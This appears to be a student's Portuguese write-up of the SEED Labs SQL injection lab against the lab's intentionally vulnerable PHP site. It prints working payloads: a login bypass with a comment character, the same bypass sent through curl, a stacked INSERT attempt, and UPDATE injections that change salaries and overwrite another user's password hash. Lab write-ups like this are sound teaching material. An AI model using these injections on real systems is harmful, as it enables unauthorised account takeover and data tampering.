# Seed Labs 8 - SQL Injection

## Task 1

Nesta primeira task, apenas corremos a linha para abrir o terminal do mysql:

```bash
mysql -u root -pdees
```
Agora dentro, corremos as seguintes linhas:
```sql
use sqlab_users;
show tables;
```
![](../pictures/SQL1.png)

## Task 2

### Parte 1

Para entrar na conta do administrador, precisavamos de dar o input do seu username ( neste caso 'admin') e escapar à verificaçao da password. Para isso, introduzimos no campo do username o seguinte:

```sql
admin' #
```
![](../pictures/SQL2.png)

A aspa a seguir a "admin" fecha o campo do username e o "#" comenta o resto do codigo, nao executando assim a verificaçao da password.

![](../pictures/SQL3.png)

Como se pode ver, entramos na conta do admin com sucesso!

### Parte 2

Para agora fazer o mesmo mas atravez do terminal, corremos o seguinte comando:

```bash
curl "http://www.seed-server.com/unsafe_home.php?username=admin%27%23&Password="
```

Isto essencialmente vai buscar a pagina "http://www.seed-server.com/unsafe_home.php" passando como parametros 
o que inserimos na Parte anterior (sendo ' = %27 e # = %23).

![](../pictures/SQL4.png)

### Parte 3 

Temos agora que tentar correr duas queries. Para isso, tentamos realizar a seguinte injeçao:

```sql
admin'; NSERT INTO `credential` VALUES (7,'Ruben','10000',20000,'9/20','10211002','','','','','fdbe918bdae83000aa54747fc95fe0470fff4976'); #
```
Infelizmente(ou felizmente) o php tem uma proteçao contra a execuçao de varias queries. Para que isso 
fosse possivel teria que se usar o comando sql "multi_query" em vez de "query".

## Task 3

Nesta task, acedemos à conta de Alice, de uma forma semalhante a como acedemos a admin:

```sql
Alice' #
```

![](../pictures/SQL5.png)

### Parte 1

Para editar o salario de Alice, fomos à pagina de Edit Profile e injetamos o seguinte no campo de NickName:

```sql
Alice', salary='99999' WHERE Name='Alice'#
```

Isto resultou na seguinte alteraçao ao perfil de Alice

![](../pictures/SQL6.png)

### Parte 2

Para editar o salario de Boby, fez-se algo bastante semalhante. Ainda na pagina de Edit Profile de Alice,
 injetamos o seguinte no campo de NickName:

```sql
Boby', salary='1' WHERE Name='Boby'#
```

Saímos da conta de Alice e acedemos à do admin para ver o resultado:

![](../pictures/SQL7.png)

Como podemos ver, o salario de Boby é agora 1!

### Parte 3

Para alterar a password de Boby para uma que seja do nosso conhecimento, foi primeiro preciso 
descobrir o metodo de encriptaçao de password. No ficheiro unsafe_edit_backend.php percebe-se que se
utiliza Sha1.

Fomos entao a um website ver o resultado da encriptaçao de "batata":

![](../pictures/SQL8.png)

Tendo agora a versao encriptada de "batata", basta substituir a password de Boby por ela. Na pagina de Alice, realizamos a 
seguinte injeçao:

```sql
Boby', Password='8467b174e821587c4a0545fd8e57204a398c66d4' WHERE Name='Boby'#
```

Voltando agora à pagina de Login, inserimos "Boby" e "batata" nos campos de Username e Password, respetivamente.

![](../pictures/SQL9.png)

Sucesso! Entramos na conta de Boby!

